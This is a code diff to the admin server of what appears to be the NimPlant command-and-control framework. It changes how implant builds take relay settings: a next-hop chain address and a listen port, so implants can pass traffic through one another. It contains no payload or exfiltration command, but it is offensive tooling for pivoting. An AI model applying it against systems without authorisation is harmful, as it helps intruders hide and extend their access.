@@ -291,20 +291,36 @@ def admin_server():
                 # Add relay configuration if provided
                 if relay_config:
                     if relay_config.get('enabled', False):
-                        relay_address = relay_config.get('address', '')
-                        relay_port = relay_config.get('port', '')
+                        # New HTTP relay system uses RELAY_CHAIN and RELAY_PORT
+                        relay_chain = relay_config.get('chain', '')  # Next hop: "host:port"
+                        relay_port = relay_config.get('listen_port', '')  # Port to listen on as relay server
                         fast_mode = relay_config.get('fast_mode', False)
                         
-                        if relay_address and relay_port:
-                            cmd.append(f"RELAY_ADDRESS=relay://{relay_address}:{relay_port}")
-                            variant += "_relay"
+                        if relay_chain:
+                            cmd.append(f"RELAY_CHAIN={relay_chain}")
+                            variant += "_relay_client"
+                            app.build_status[build_id]['progress'] = f'Relay chain next hop: {relay_chain}'
+                            utils.nimplant_print(f"Relay chain next hop: {relay_chain}")
+                            
+                        if relay_port:
+                            cmd.append(f"RELAY_PORT={relay_port}")
+                            variant += "_relay_server"
+                            app.build_status[build_id]['progress'] = f'Relay server port: {relay_port}'
+                            utils.nimplant_print(f"Relay server port: {relay_port}")
                             
                         if fast_mode:
                             cmd.append("FAST_MODE=1")
                             variant += "_fast"
                             
-                        app.build_status[build_id]['progress'] = f'Relay configuration: {relay_address}:{relay_port}, Fast mode: {fast_mode}'
-                        utils.nimplant_print(f"Relay configuration: {relay_address}:{relay_port}, Fast mode: {fast_mode}")
+                        if relay_chain and relay_port:
+                            app.build_status[build_id]['progress'] = f'Relay config: Chain={relay_chain}, Listen={relay_port}, Fast={fast_mode}'
+                            utils.nimplant_print(f"Relay config: Chain={relay_chain}, Listen={relay_port}, Fast={fast_mode}")
+                        elif relay_chain:
+                            app.build_status[build_id]['progress'] = f'Relay client: Chain={relay_chain}, Fast={fast_mode}'
+                            utils.nimplant_print(f"Relay client: Chain={relay_chain}, Fast={fast_mode}")
+                        elif relay_port:
+                            app.build_status[build_id]['progress'] = f'Relay server: Listen={relay_port}, Fast={fast_mode}'
+                            utils.nimplant_print(f"Relay server: Listen={relay_port}, Fast={fast_mode}")
                 
                 # Add workspace as environment variable if specified
                 if workspace:
